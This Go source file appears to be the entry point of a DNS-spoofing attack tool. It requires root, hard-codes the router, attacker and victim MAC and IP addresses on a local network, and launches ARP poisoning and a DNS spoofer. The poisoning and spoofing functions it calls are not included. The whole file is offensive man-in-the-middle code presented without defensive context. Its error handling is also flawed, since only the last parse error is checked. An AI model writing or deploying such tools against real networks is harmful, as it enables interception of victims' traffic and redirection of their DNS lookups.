package main

import (
	"fmt"
	"net"
	"os"
)

func main() {
	if os.Geteuid() != 0 {
		fmt.Println("dnsspoof requires root!")
		return
	}

	var dev = "eno1"

	fmt.Println("Running arp poison")
	routerMac, err := net.ParseMAC("00:1A:6D:38:15:FF")
	routerIP := net.IP{192, 168, 1, 100}
	localMac, err := net.ParseMAC("98:90:96:D5:84:7B")
	localIP := net.IP{192, 168, 1, 9}
	victimMac, err := net.ParseMAC("98:90:96:DC:fB:6A")
	victimIP := net.IP{192, 168, 1, 10}
	/********* end parse all IP's and MAC's relevent for poisoning / spoofing *********/

	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	go arpPoison(dev, routerMac, routerIP, localMac, localIP, victimMac, victimIP)

	fmt.Println("Running spoofer")
	spoof(dev)
}
